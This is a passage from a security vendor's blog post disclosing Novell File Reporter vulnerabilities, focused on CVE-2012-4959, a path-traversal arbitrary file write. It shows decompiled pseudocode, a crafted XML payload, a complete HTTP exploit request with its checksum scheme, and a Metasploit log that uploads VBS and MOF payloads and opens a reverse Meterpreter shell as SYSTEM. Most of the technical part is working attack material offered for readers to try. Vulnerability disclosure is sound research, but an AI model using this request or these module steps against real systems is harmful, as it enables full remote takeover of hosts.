[*] Auxiliary module execution completed
msf  auxiliary(novell_file_reporter_fsfui_fileaccess) &gt; cat /Users/juan/.msf4/loot/20121109154657_default_192.168.1.150_novell.filerepor_624595.ini
[*] exec: cat /Users/juan/.msf4/loot/20121109154657_default_192.168.1.150_novell.filerepor_624595.ini

[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect
 
</code></pre>
<h3 id="cve20124959arbitraryfileupload"><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4959">CVE-2012-4959</a> - Arbitrary File Upload</h3>
<p>The NFSAgent.exe allows communication with the Agent component over HTTPS on port TCP 3037. The requests against the Agent component are XML messages, containing “records” to be processes by the Agent.  The vulnerability occurs when the NFRAgent.exe handles requests on the URL “/FSF/CMD”.  When handling RECORDs with NAME “FSFUI” and UICMD “130” the request is managed by the function named as read_file_sub_40A190 () whose decompiled pseudocode is presented below:</p>
<pre><code>int __stdcall write_file_sub_40A190(char *xml_message_arg_0, char *a2)  
{  
  size_t v2; // eax@1  
  int result; // eax@6  
  char result_arg_8[256]; // [sp+Ch] [bp-150h]@1  
  int v5; // [sp+10Ch] [bp-50h]@4  
  void *v6; // [sp+110h] [bp-4Ch]@3  
  int v7; // [sp+114h] [bp-48h]@1  
  FILE *v8; // [sp+118h] [bp-44h]@2  
  char v9; // [sp+11Ch] [bp-40h]@1  
  char v10; // [sp+154h] [bp-8h]@1  
  
  
  memcpy(&amp;v9, &quot;&lt;RESULT&gt;&lt;VERSION&gt;1&lt;/VERSION&gt;&lt;STATUS&gt;%d&lt;/STATUS&gt;&lt;/RESULT&gt;&quot;, 0x38u);  
  v10 = aResultVersi_21[56];  
  v7 = sub_40B670();  
  strcpy(result_arg_8, Buffer);  
  strcat(result_arg_8, &quot;\\&quot;);  
  v2 = strlen(result_arg_8);  
  // The contents of the element &lt;FILE&gt; from the XML request are used to build the file path  
  // (stored in the result_arg_8 variable  
  if ( (unsigned __int8)parse_tag_sub_40A760(xml_message_arg_0, (int)&quot;FILE&quot;, &amp;result_arg_8[v2], 256) )  
  {  
    // The file path built from the &lt;FILE&gt; element is used in “fopen”. Using a directory  
    // traversal an arbitrary file can be opened in write mode.  
    v8 = fopen(result_arg_8, &quot;wb&quot;);  
    if ( v8 )  
    {  
      sprintf(a2, &amp;v9, 0);  
      // The contents between the tags “&lt;![CDATA[“ and “]]&gt;” are parsed from the user XML  
      // request.  
      v6 = (void *)sub_403F40(xml_message_arg_0, &quot;&lt;![CDATA[&quot;);  
      if ( v6 )  
      {  
        v6 = (char *)v6 + 9;  
        v5 = sub_403F40((char *)v6, &quot;]]&gt;&quot;);  
        if ( v5 )  
          // The parsed contents are written to the specified file.  
          fwrite(v6, 1u, v5 - (_DWORD)v6, v8);  
      }  
      result = fclose(v8);  
    }  
    else  
    {  
      result = sprintf(a2, &amp;v9, 14);  
    }  
  }  
  else  
  {  
    result = sprintf(a2, &amp;v9, 14);  
  }  
  
  
  return result;  
} 
</code></pre>
<p>In the code presented above the file path is retrieved from the FILE element of the XML request. The filename is used to call the function fopen(). Using a path traversal is possible to open or create any file in the filesystem with SYSTEM privileges. After that, the request is parsed for the “<![CDATA[“ and “]]>” tags and the contents between them are written to the file with “fwrite()”.</p>
<p><strong>Exploitation</strong></p>
<p>In order to exploit the vulnerability the user must build a XML message like this one:</p>
<pre><code>&lt;RECORD&gt;  
    &lt;NAME&gt;FSFUI&lt;/NAME&gt;  
    &lt;UICMD&gt;130&lt;/UICMD&gt;  
    &lt;FILE&gt;..\..\..\..\..\..\test.txt&lt;/FILE&gt;&lt;![CDATA[test]]&gt;  
&lt;/RECORD&gt;  
</code></pre>
<p>The file to write must be specified in the <FILE> element.  The contents with a “<![CDATA[contents]]>” element. The message must be sent through HTTPS to the PATH “/FSF/CMD”.</p>
<p>The HTTP body must include a concatenation of a MD5 checksum of the xml message and the xml message. In order to generate a correct MD5 checksum of the xml message, it must be generated from a string with the next format: <strong>“SRS” XML MESSAGE “SERVER”</strong>, where “SRS” and “SERVER” are static strings.</p>
<p>As example the next HTTP request allows to write the string “metasploit” in the “C:\msf.txt” file:</p>
<pre><code>POST /FSF/CMD HTTP/1.1
Host: 192.168.1.137:2037
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: text/xml
Content-Length: 145
 
 
3CFD5A649F67C0522A7FE1EDAC0382BF&lt;RECORD&gt;&lt;NAME&gt;FSFUI&lt;/NAME&gt;&lt;UICMD&gt;130&lt;/UICMD&gt;&lt;FILE&gt;..\..\..\..\..\..\msf.txt&lt;/FILE&gt;&lt;![CDATA[metasploit]]&gt;&lt;/RECORD&gt;
</code></pre>
<p>If the file is written correctly a response with STATUS 0 is returned back to the user:</p>
<pre><code>HTTP/1.1 200 OK
MIME-version: 1.0
Connection: close
Content-Type: text/xml
Content-Length: 55
 
 
&lt;RESULT&gt;&lt;VERSION&gt;1&lt;/VERSION&gt;&lt;STATUS&gt;0&lt;/STATUS&gt;&lt;/RESULT&gt;
</code></pre>
<p>In order to achieve remote code execution in versions smaller than Windows Vista, such as Windows XP SP3 and Windows 2003 SP2, the Windows Management Instrumentation has been used. A Metasploit module has been developed:</p>
<pre><code> 
msf &gt; use exploit/windows/novell/file_reporter_fsfui_upload 
msf  exploit(file_reporter_fsfui_upload) &gt; set RHOST 192.168.1.150 
RHOST =&gt; 192.168.1.150
msf  exploit(file_reporter_fsfui_upload) &gt; show options

Module options (exploit/windows/novell/file_reporter_fsfui_upload):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   DEPTH    6                yes       Traversal depth
   Proxies                   no        Use a proxy chain
   RHOST    192.168.1.150    yes       The target address
   RPORT    3037             yes       The target port
   SSL      true             yes       Use SSL
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf  exploit(file_reporter_fsfui_upload) &gt; exploit

[*] Started reverse handler on 192.168.1.129:4444 
[*] Encoding payload into vbs...
[*] Generating mof file...
[*] 192.168.1.150:3037 - Uploading the VBS payload
[*] 192.168.1.150:3037 - VBS payload successfully uploaded
[*] 192.168.1.150:3037 - Uploading the MOF file
[*] 192.168.1.150:3037 - MOF file successfully uploaded
[*] Sending stage (752128 bytes) to 192.168.1.150
[*] Meterpreter session 1 opened (192.168.1.129:4444 -&gt; 192.168.1.150:1133) at 2012-11-09 16:12:57 +0100
[!] Deleting the vbs payload &quot;wGYrt.vbs&quot; ...
[!] Deleting the mof file &quot;lOpOwwjuW.mof&quot; ...

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt; exit
[*] Shutting down Meterpreter...

[*] 192.168.1.150 - Meterpreter session 1 closed.  Reason: User exit
 
</code></pre>
<p>Want to try this out for yourself? <a href="http://www.rapid7.com/downloads/metasploit.jsp">Get your free Metasploit download now</a> or update your existing installation, and let us know if you have any further questions.</p>
<!--kg-card-end: markdown-->
                        </div>
                    </div>
                    <div class="grid-y post-bottom-info__wrapper">
                        <div class="cell-padding">
                            <div class="post-bottom-info" id="post-bottom-info">
                                <div class="grid-x">
                                    <div class="medium-12 large-6 cell text-center large-text-left smpad-btm">
                                        <h4>POST TAGS</h4>
                                        <div class="tag-row wrapper-item">
                                            <div class="blog-resources__tags">
                                                <ul>
                                                </ul>
                                            </div>
                                        </div>
                                        <h4>SHARING IS CARING</h4>
                                        <ul class="blog-post-social">
                                            <li>
                                                <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/&amp;title=New+0day+Exploits%3a+Novell+File+Reporter+Vulnerabilities&amp;summary=Today%2c+we+present+to+you+several+new+vulnerabilities+discovered+in+Novell+File+Reporter+1.0.2%2c+which+%22helps+organizations+more+effectively+manage+network+storage+by+providing+administrators+the+ability+to+access+comprehensive+network+storage+information+so+that+they+can+determine+the+best+means+of+addressing+their+storage+content%22.+Following+our+standard+disclosure+policy+%5bhttp%3a%2f%2fwww.rapid7.com%2fdisclosure.jsp%5d%2c+we+notified+both+Novell+and+CERT.+Vulnerabilities+Summary+The+four+vulnerabilities+p"
                                                   onclick="window.open(this.href, 'linkedin-share', 'width=520,height=570');return false;"
                                                   class="linkedin"></a>
                                            </li>
                                            <li>
                                                <a href="https://twitter.com/intent/tweet?text=New+0day+Exploits%3a+Novell+File+Reporter+Vulnerabilities&amp;url=https%3a%2f%2fwww.rapid7.com%2fblog%2fpost%2f2012%2f11%2f16%2fnfr-agent-buffer-vulnerabilites-cve-2012-4959%2f"
                                                   onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;"
                                                   class="twitter"></a>
                                            </li>
                                            <li>
                                                <a href="https://www.facebook.com/sharer/sharer.php?u=https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/"
                                                   onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;"
                                                   class="facebook"></a>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="cell medium-12 large-6 end">
                                        <div class="author-box text-center large-text-left">
                                            <div class="content">
                                                <div class="column-left">
                                                    <h4>AUTHOR</h4>
                                                </div>
                                                <div class="column-right">
                                                    <a href="/blog/author/juan-vazquez/" class="post-author" style="background-image: url(https://rapid7.com/globalassets/_images/blog-author-images/author-icon-7621.png);">
                                                    </a>
                                                </div>
                                                <a class="name" href="/blog/author/juan-vazquez/" title="Juan Vazquez">
                                                    Juan Vazquez
                                                </a>
                                            </div>
                                            <p>
                                                
                                            </p>
                                            <a href="/blog/author/juan-vazquez/" class=" button smBtn clear">View Juan's Posts</a>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- disqus comments -->
                            <div id="disqus_thread" class="hide-for-small-only"></div>
                            <script>
                                /**
                                *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
                                *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/

                                var disqus_config = function () {
                                    this.page.url = 'https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/';  // Replace PAGE_URL with your page's canonical URL variable
                                    this.page.identifier = '5dfce5056e0a7c0e034eb950'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                                };

                                (function () { // DON'T EDIT BELOW THIS LINE
                                    var d = document, s = d.createElement('script');
                                    s.src = 'https://rapid7.disqus.com/embed.js';
                                    s.setAttribute('data-timestamp', +new Date());
                                    (d.head || d.body).appendChild(s);
                                })();
                            </script>
                            <noscript>
                                Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">
                                    comments powered by
                                    Disqus.
                                </a>
                            </noscript>
                            <!-- /disqus comments -->
                        </div>
                    </div>
                </div>

                <div class="small-12 medium-4 large-3 cell blog-single-post__right-column medium-order-1 small-order-2">
                    <div class="blog-post-img hide-for-small-only">
                        <img src="https://blog.rapid7.com/content/images/post-feature-images/post-img-12590.jpg" alt="">
                    </div>
                    <section class="blog-resources">
                        


    <div class="blog-resources__topics">
        <div class="text-center large-text-left blog-resources__heading">
            <h2>Topics</h2>
        </div>
        <ul>
                <li class="text-center medium-text-left">
                    <a href="/blog/tag/metasploit/">
                        Metasploit
                        &nbsp;<i>(740)</i>
                    </a>
                </li>
                <li class="text-center medium-text-left">
                    <a href="/blog/tag/vulnerability-management/">
                        Vulnerability Management
                        &nbsp;<i>(372)</i>
                    </a>
                </li>
                <li class="text-center medium-text-left">
                    <a href="/blog/tag/detection-and-response/">
                        Detection and Response
                        &nbsp;<i>(323)</i>
                    </a>
                </li>
                <li class="text-center medium-text-left">
                    <a href="/blog/tag/research/">
                        Research
                        &nbsp;<i>(216)</i>
                    </a>
                </li>
                <li class="text-center medium-text-left">
                    <a href="/blog/tag/application-security/">
                        Application Security
                        &nbsp;<i>(126)</i>
                    </a>
                </li>
                <li class="text-center medium-text-left">
                    <a href="/blog/tag/cloud-security/">
                        Cloud Security
                        &nbsp;<i>(55)</i>
                    </a>
                </li>
        </ul>
    </div>


    <div class="blog-resources__tags">
        <div class="text-center large-text-left blog-resources__heading">
            <h2>Popular Tags</h2>
        </div>
        <div class="search">
            <div class="search-wrapper">
                <input class="search-input" placeholder="Search Tags" disabled>
                <i class="r7-icon r7-icon-search-magnify"></i>
            </div>
        </div>
        <div class="blog-resources__tags-no-search">
            <ul class="text-center medium-text-left large-text-left">
                    <li><a href="/blog/tag/metasploit/">Metasploit</a></li>
                    <li><a href="/blog/tag/logentries/">Logentries</a></li>
                    <li><a href="/blog/tag/it-ops/">IT Ops</a></li>
                    <li><a href="/blog/tag/vulnerability-management/">Vulnerability Management</a></li>
                    <li><a href="/blog/tag/detection-and-response/">Detection and Response</a></li>
                    <li><a href="/blog/tag/metasploit-weekly-wrapup/">Metasploit Weekly Wrapup</a></li>
                    <li><a href="/blog/tag/automation-and-orchestration/">Automation and Orchestration</a></li>
                    <li><a href="/blog/tag/nexpose/">Nexpose</a></li>
                    <li><a href="/blog/tag/incident-detection/">Incident Detection</a></li>
                    <li><a href="/blog/tag/research/">Research</a></li>
                    <li><a href="/blog/tag/komand/">Komand</a></li>
                    <li><a href="/blog/tag/exploits/">Exploits</a></li>
                    <li><a href="/blog/tag/incident-response/">Incident Response</a></li>
                    <li><a href="/blog/tag/insightidr/">InsightIDR</a></li>
                    <li><a href="/blog/tag/penetration-testing/">Penetration Testing</a></li>
            </ul>
        </div>
        <div class="blog-resources__tags-search hide"></div>
    </div>

                    </section>

                </div>

            </div>
        </div>
    </section>
</div>



<footer >

        <section class="search-scroll">
            <div class="grid-container">
                <div class="grid-x grid-padding-x">
                    <div class="medium-5 medium-offset-1 cell footer__search">
                        <form action="/search/">
                            <input class="sb-search-input" placeholder="Search all the things" type="search" value="" name="q" id="search">
                            <input class="sb-search-submit" type="submit" value="">
                        </form>
                    </div>
                    <div class="medium-5 cell footer__scroll">
                        <a href="#__" class="smooth">
                            <span>BACK TO TOP</span>
                            <img class="lazy" data-src="/includes/img/up-arrow-lightgray.png" src="/includes/img/placeholder-transparent.png" />
                        </a>
                    </div>
                </div>
            </div>
        </section>

        <div class="grid-container">
            <section class="footer__links grid-x grid-padding-x">
                <div class="medium-10 medium-offset-1 cell footer__links-wrapper">
                    <div class="footer__links-col">
                        <div class="footer__links-section footer__contact">
                            <a href="/">
                                <img alt="Rapid7 logo" class="logo lazy" data-src="/includes/img/Rapid7_logo.svg" src="/includes/img/placeholder-transparent.png" />
                            </a>
                                            <div class="footer__links-title">CUSTOMER SUPPORT</div>
                <a class="link" href="tel:1-866-390-8113">+1-866-390-8113 (Toll Free)</a>
                <div class="footer__links-title">SALES SUPPORT</div>
                <a class="link" href="tel:866-772-7437">+1-866-772-7437 (Toll Free)</a>

                                <div class="footer__breach">
                                    <div class="footer__breach-title">Need immediate help with a breach?</div>
                                    <div class="footer__breach-contact">
                                        <div class="footer__breach-icon"></div>
                                        <div class="footer__breach-phone"><a href="tel:18447274347">+1-844-727-4347</a></div>
                                    </div>
                                </div>
                        </div>
                        <div class="footer__links-section footer__solutions">
                                            <div class="footer__links-title">SOLUTIONS</div>
                <a class="link" href="https://www.rapid7.com/solutions">All Solutions</a>
                <a class="link" href="https://www.rapid7.com/solutions/industry">Industry Solutions</a>
                <a class="link" href="https://www.rapid7.com/solutions/compliance/">Compliance Solutions</a>

                        </div>
                    </div>
                    <div class="footer__links-col">
                        <div class="footer__links-section footer__support">
                                            <div class="footer__links-title">SUPPORT & RESOURCES</div>
                <a class="link" href="https://www.rapid7.com/for-customers">Product Support</a>
                <a class="link" href="https://www.rapid7.com/resources">Resource Library</a>
                <a class="link" href="https://www.rapid7.com/about/customers">Customer Stories</a>
                <a class="link" href="https://www.rapid7.com/about/events-webcasts">Events & Webcasts</a>
                <a class="link" href="https://www.rapid7.com/services/training-certification">Training & Certification</a>
                <a class="link" href="https://www.rapid7.com/fundamentals">IT & Security Fundamentals</a>
                <a class="link" href="https://www.rapid7.com/db">Vulnerability & Exploit Database</a>

                        </div>
                        <div class="footer__links-section footer__about">
                                            <div class="footer__links-title">ABOUT US</div>
                <a class="link" href="https://www.rapid7.com/about/company">Company</a>
                <a class="link" href="https://www.rapid7.com/about/diversity-equity-and-inclusion/">Diversity, Equity, and Inclusion</a>
                <a class="link" href="https://www.rapid7.com/about/leadership">Leadership</a>
                <a class="link" href="https://www.rapid7.com/about/news">News & Press Releases</a>
                <a class="link" href="https://www.rapid7.com/about/public-policy">Public Policy</a>
                <a class="link" href="https://www.rapid7.com/open-source/">Open Source</a>
                <a class="link" href="https://investors.rapid7.com/">Investors</a>

                        </div>
                    </div>

                    <div class="footer__links-col">
                        <div class="footer__links-section footer__connect">
                                            <div class="footer__links-title">CONNECT WITH US</div>
                <a class="link" href="https://www.rapid7.com/contact">Contact</a>
                <a class="link" href="https://blog.rapid7.com/">Blog</a>
                <a class="link" href="https://support.rapid7.com/">Support Login</a>
                <a class="link" href="https://www.rapid7.com/careers">Careers</a>

                            <div class="footer__links-social">
                                <a class="linkedin no-new-open" href="https://www.linkedin.com/company/39624" target="_blank"></a>
                                <a class="twitter no-new-open" href="https://twitter.com/Rapid7" target="_blank"></a>
                                <a class="facebook no-new-open" href="https://www.facebook.com/rapid7" target="_blank"></a>
                                <a class="instagram no-new-open" href="https://www.instagram.com/rapid7/" target="_blank"></a>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </div>

    <section class="footer__legal">
        <div class="grid-container">
            <div class="grid-x grid-padding-x">
                <div class="medium-10 medium-offset-1 cell">
                    <div class="footer__legal-copyright">&copy; Rapid7</div>

                            <div class="footer__legal-link"><a href="https://www.rapid7.com/legal">Legal Terms</a></div>
&nbsp; | &nbsp;                            <div class="footer__legal-link"><a href="https://www.rapid7.com/privacy-policy">Privacy Policy</a></div>
&nbsp; | &nbsp;                            <div class="footer__legal-link"><a href="https://www.rapid7.com/export-notice">Export Notice</a></div>
&nbsp; | &nbsp;                            <div class="footer__legal-link"><a href="https://www.rapid7.com/trust">Trust</a></div>
                </div>
            </div>
        </div>
    </section>

            <section class="contact-sticky">
                <div class="grid-container">
                    <div class="grid-x grid-padding-x expanded">
                        <div id="stickyButtons" class="cell driftInit">
                            <div class="chatBtn show-if-chat-online" id="stickyChat">
                                <a class="gray button">Chat</a>
                            </div>
                            <div class="contactBtn" data-open="stickyContact">
                                <a id="sticky_contact_btn" class="gray button">
                                    Contact Us
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <div class="reveal light hasSidebar" id="stickyContact" data-reveal>
                <section class="contactForm">
                    <div class="grid-container">
                        <div class="grid-x grid-padding-x">
                            <div class="large-9 cell">
                                



<form id="contactModal" class="formBlock freemail mkto contactModal">
    <div id="intro">
        <div id="thankyouText" style="display:none;" class="messageBox green">
            <h4><span class="success">Success!</span> Thank you for submission. We will be in touch shortly.</h4>
        </div>
        <div id="errorText" style="display:none;" class="messageBox red">
            <h4><span class="error">Oops!</span> There was a problem in submission. Please try again.</h4>
        </div>
        <div>
            <h2>Submit your information and we will get in touch with you.</h2>
        </div>
    </div>
    <fieldset>
        <p id="fieldInstruction" class="instructions">All fields are mandatory</p>

        <dl>
            <dd>
                <label for="firstName">First Name</label>
                <input id="firstName" type="text" name="firstName" tabindex="3">
            </dd>
        </dl>
        <dl>
            <dd>
                <label for="lastName">Last Name</label>
                <input id="lastName" type="text" name="lastName" tabindex="4">
            </dd>
        </dl>
        <dl>
            <dd>
                <label for="jobTitle">Job Title</label>
                <input id="jobTitle" type="text" name="jobTitle" tabindex="5">
            </dd>
        </dl>
        <dl>
            <dd>
                <label for="jobLevel">Job Level</label>
                <select name="jobLevel" id="jobLevel" tabindex="1" class="normalSelect dropdownSelect">
                    <option value="0">Job Level</option>
                        <option value="Analyst">Analyst</option>
                        <option value="System/Security Admin">System/Security Admin</option>
                        <option value="Manager">Manager</option>
                        <option value="Director">Director</option>
                        <option value="VP">VP</option>
                        <option value="CxO">CxO</option>
                        <option value="Student">Student</option>
                        <option value="Other">Other</option>
                </select>
            </dd>
        </dl>
        <dl>
            <dd>
                <label for="companyName">Company</label>
                <input id="companyName" type="text" name="companyName" tabindex="6">
            </dd>
        </dl>
        <dl>
            <dd>
                <label for="email">Email</label>
                <input id="email" type="text" name="email" tabindex="7">
            </dd>
        </dl>
        <dl>
            <dd>
                <div class="intl-phone">
                    <label for="phone">Phone</label>
                    <div class="flag-container">
                        <div class="selected-flag">
                            <div class="iti-flag"></div>
                        </div>
                        <ul class="country-list"></ul>
                    </div>
                    <input id="phone" type="text" name="phone" tabindex="8" />
                </div>
            </dd>
        </dl>
        <dl>
            <dd>
                <label for="country">Country</label>
                <select name="country" id="country" tabindex="9" class="form_SelectInstruction normalSelect" onchange="updateCountryData('#contactModal');"></select>
            </dd>
        </dl>
        <dl>
            <dd>
                <label for="state">State</label>
                <select name="state" id="state" tabindex="10" class="form_SelectInstruction normalSelect dropdownSelect"></select>
            </dd>
        </dl>
        <dl class="clearfix expand">
            <dd>
                <label for="state">Reason for Contact</label>
                <select name="contactType" id="contactType" tabindex="1" class="normalSelect dropdownSelect">
                    <option value="0" >- Select -</option>
                        <option value="20437" data-subopts="20437|Request a Demo;20438|Get Pricing Info;20439|General">I&#39;d like to learn more about vulnerability management</option>
                        <option value="20440" data-subopts="20440|Request a Demo;20441|Get Pricing Info;20442|General">I&#39;d like to learn more about application security</option>
                        <option value="20443" data-subopts="20443|Request a Demo;20444|Get Pricing Info;20445|General">I&#39;d like to learn more about incident detection and response</option>
                        <option value="20433" data-subopts="20433|Request a Demo;20446|Get Pricing Info;20447|General">I&#39;d like to learn more about cloud security</option>
                        <option value="20448" data-subopts="">I&#39;d like to learn more about Rapid7 professional or managed services</option>
                        <option value="20450" data-subopts="">I&#39;d like to learn more about visibility, analytics, and automation</option>
                        <option value="20434" data-subopts="20434|Request a Demo;20435|Get Pricing Info;20436|General">I&#39;d like to learn more about building a comprehensive security program</option>
                        <option value="21019" data-subopts="21019|Request a demo;21021|Get Pricing Info;21020|General">I&#39;d like to learn more about threat intelligence.</option>
                </select>
            </dd>
        </dl>
        <dl class="clearfix expand" id="contactTypeSecondaryParent" style="display:none;">
            <dd>
                <select name="contactTypeSecondary" id="contactTypeSecondary" tabindex="2" class="normalSelect dropdownSelect">
                    <option value="0">- Select -</option>
                </select>
            </dd>
        </dl>
        <dl class="expand" id="consultant" style="display: none;">
            <input id="consultantField" type="checkbox" class="r7-check">
            <label for="consultantField">I am a consultant, partner, or reseller.</label>
            <br />
            <br />
        </dl>
        <dl class="expand checkboxContainer" id="optout" style="display:none;">
            <dd>
                <input id="explicitOptOut" type="checkbox" class="r7-check">
                <label for="explicitOptOut">I do not want to receive emails regarding Rapid7's products and services.</label>
            </dd>
            <div class="disc">
                <p>Issues with this page? Please email <a href="mailto:info@rapid7.com">info@rapid7.com</a>. Please see updated <a href="/link/678c9fbe33a749f8b614a7be0e36e7ee.aspx">Privacy Policy</a></p>
            </div>
        </dl>
        <dl class="expand">
            <button  class="submit button blue mdBtn" tabindex="11">Submit</button>
        </dl>
        <input type="hidden" id="formName" value="ContactPage">
        <input type="hidden" id="contactUsFormURL" value="https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/">
        <input type="hidden" id="landorExpand" value="land">
    </fieldset>
</form>

                            </div>
                            <div class="large-3 cell sidebar">
                                <img alt="Rapid7 logo" class="logo lazy" data-src="/includes/img/logo-black.png" src="/includes/img/placeholder-transparent.png" />
                                <h3>General:</h3>
                                <p><a href="mailto:info@rapid7.com">info@rapid7.com</a></p>
                                <h3>Sales: </h3>
                                <p>
                                    <a href="tel:1-866-772-7437">+1-866-772-7437</a><br />
                                    <a href="mailto:sales@rapid7.com">sales@rapid7.com</a>
                                </p>
                                <h3>Support:</h3>
                                <p>
                                    <a href="tel:1-866-390-8113">+1&ndash;866&ndash;390&ndash;8113 (toll free)</a><br />
                                    <a href="mailto:support@rapid7.com">support@rapid7.com</a>
                                </p>
                                <h3>Incident Response:</h3>
                                <p><a href="tel:1-844-787-4937">1-844-727-4347</a></p>
                                <p><a href="/contact/" class="view_more">More Contact Info</a></p>
                            </div>
                        </div>
                    </div>

                </section>
                <button class="close-button" data-close="" aria-label="Close reveal" type="button"></button>
            </div>
</footer>



    <div class="reveal light" id="modal-subscribe" data-reveal>
        <h2>Never miss a blog</h2>
        <p>Get the latest stories, expertise, and news about security today.</p>
        <form id="mktoForm_4144"></form>
        <div id="thankyou" style="display: none;">You’re almost done! <br> Check your email to confirm your subscription.</div>
        <script>
            MktoForms2.loadForm("//app-sj20.marketo.com", "411-NAK-970", 4144, function (form) {
                form.onSuccess(function (values, followUpUrl) {
                    window.dataLayer.push({ 'event': 'form_submit_success' });
                    form.getFormElem().hide();
                    document.getElementById("thankyou").style.display = "block";
                    return false;
                });
            });
        </script>
        <button class="close-button" data-close="" aria-label="Close reveal" type="button"></button>
    </div>


        </div>
    </div>
</div>





    <!-- scripts -->
    <!--[if lte IE 11]>
    <script src="https://polyfill.io/v2/polyfill.min.js?features=IntersectionObserver"></script>
    <![endif]-->
    <script src="/includes/js/all.min.js?cb=1635259399378"></script>
    
    
    <script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script>
    <script>
        (function ($) {
            $(document).ready(function () {
                // Handle subscribe button click
                $('.subscribe-btn').click(function () {
                    $('#modal-subscribe').foundation('open');
                });

            });

            $(window).load(function () {
                $('pre.line-numbers').addClass('prettyprint').find('code').replaceWith(function () {
                    return $("<div />", { html: $(this).html() });
                });
                PR.prettyPrint();
            });


        })(jQuery);
    </script>

    <script></script>



     <script type="text/javascript" src="/includes/js/bundles/block.blog-tags-list.min.js?cb=1635259399378" async defer></script>

    <style type="text/css">
.blog-single-post__main-column .post-content a.subscribe-btn { color:#fff; }
</style>
</body>
</html>